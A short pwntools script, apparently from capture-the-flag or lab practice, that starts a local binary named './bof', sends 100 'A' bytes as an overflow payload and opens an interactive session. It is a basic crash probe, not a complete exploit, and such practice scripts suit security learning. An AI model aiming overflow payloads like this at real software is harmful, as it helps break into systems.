#!/usr/bin/env python3

from pwn import *

io = process('./bof')
payload = b'A'*100

io.recv()
io.sendline(payload)
io.interactive()
